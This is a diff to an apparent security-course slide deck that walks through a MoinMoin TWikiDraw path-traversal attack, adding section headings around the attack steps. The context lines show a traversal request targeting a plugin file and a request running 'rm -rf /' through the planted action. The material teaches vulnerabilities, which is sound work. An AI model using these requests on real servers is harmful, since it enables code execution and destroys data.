@@ -371,6 +371,8 @@ Note:
 
 ---
 
+## Editing an image
+
 * GET /?action=twikidraw&do=modify&target=image.tar
 * => Response: file_auth_ticket
     * e.g. fe3321bcda
@@ -379,6 +381,8 @@ Note:
 - To actually edit an image, first you acquired an auth token (TWikiDraw would check your permissions)
 
 ---
+
+## Editing an image
 
 * GET /?action=twikidraw&do=modify&target=image.tar
 * => Response: file_auth_ticket
@@ -393,6 +397,8 @@ Note:
 - Then you used that token (ticket) to confirm you had permission to edit that image and save it
 
 ---
+
+## Editing an ... image?
 
 * GET /?action=twikidraw&do=modify
 * &target=../../../plugin/action/moinexec.py
@@ -426,7 +432,7 @@ GET /?action=moinexec&c=rm%20-rf%20/
 
 ---
 
-## Vulnerable Dependencies / Improper Authorization Checks
+## Vulnerable Dependency / Improper Authorization Checks
 
 ### Questions?
 
@@ -515,7 +521,6 @@ Small group discussion. Consider:
 * What are the trade-offs?
 
 ---
-
 
 # Other Questions?
 
